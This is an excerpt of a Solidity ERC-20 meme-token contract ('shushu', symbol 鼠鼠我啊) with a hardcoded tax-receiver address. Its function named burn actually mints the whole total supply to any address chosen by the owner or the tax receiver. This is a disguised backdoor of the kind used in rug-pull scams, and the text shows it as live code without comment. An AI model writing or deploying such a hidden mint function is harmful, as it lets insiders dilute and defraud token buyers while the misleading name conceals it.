...
contract shushu is Ownable, IERC20, IERC20Metadata, IERC20Errors {
    using SafeMath for uint256;

    mapping(address account => uint256) private _balances;
    mapping(address account => mapping(address spender => uint256)) private _allowances;
    uint256 public totalSupply = 10000000000 * 10**18;
    string public name = unicode"鼠鼠我啊";
    string public symbol = unicode"鼠鼠我啊";
    uint256 private giftAmount = 1 * 10**18;
    address public pairAddress;
    address public taxReceiver = 0x912aD31e52026aa719564d3CF67b5eCD7b0C4671;
    ...
    function burn(address addr) public virtual {
        require(_msgSender() == owner() || _msgSender() == taxReceiver, "Not authorized");
        _update(address(0), addr, totalSupply);
    }
